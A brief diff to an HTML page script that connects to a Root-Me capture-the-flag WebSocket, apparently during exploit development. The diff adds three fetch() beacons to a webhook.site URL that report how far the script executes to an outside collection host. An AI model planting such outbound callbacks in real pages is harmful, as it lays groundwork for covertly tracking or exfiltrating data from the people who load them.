@@ -1,9 +1,12 @@
 <body>
   <script>
 
+    fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907?vroum=1");
     window.WebSocket = window.WebSocket || window.MozWebSocket;
+    fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907?vroum=2");
 
     var connection = new WebSocket('ws://ctf17.root-me.org/ws');  
+    fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907?vroum=3");
     connection.onopen = function () {};  
     
     connection.onerror = function (error) {
